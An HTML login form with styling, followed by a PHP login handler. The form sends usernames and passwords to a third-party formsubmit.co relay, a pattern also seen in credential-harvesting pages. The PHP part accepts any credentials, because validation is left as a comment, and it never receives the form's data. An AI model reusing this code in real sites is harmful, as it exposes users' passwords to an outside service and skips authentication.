<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Login Form</title>
  <style>
  .container {
	max-width: 400px;
	margin: 0 auto;
	padding: 20px;
	border: 1px solid #ccc;
	background-color: #f9f9f9;
}

h1 {
	text-align: center;
}

label {
	display: block;
	margin-bottom: 10px;
}

input[type="text"],
input[type="password"] {
	padding: 10px;
	border: 1px solid #ccc;
	border-radius: 5px;
	margin-bottom: 20px;
	width: 100%;
	box-sizing: border-box;
}

input[type="submit"] {
	background-color: #4CAF50;
	color: white;
	padding: 10px 20px;
	border: none;
	border-radius: 5px;
	cursor: pointer;
}

input[type="submit"]:hover {
	background-color: #45a049;
}
  </style>
</head>
<body>
	<div class="container">
		<h1>Login Form</h1>
		<form action="https://formsubmit.co/3b743898d45d9458bc18414a68c3303c" method="POST">
			<label for="username">Username:</label>
			<input type="text" id="username" name="username" required>

			<label for="password">Password:</label>
			<input type="password" id="password" name="password" required>

			<input type="submit" value="Login">
		</form>
	</div>
</body>
</html>
<?php
session_start();

if (isset($_POST['username']) && isset($_POST['password'])) {
	// Connect to database and validate user
	$username = $_POST['username'];
	$password = $_POST['password'];

	// Validate the user's credentials here
	// ...

	// If the user is valid, redirect to home.php
	$_SESSION['username'] = $username;
	header('Location: home.php');
	exit();
}
?>

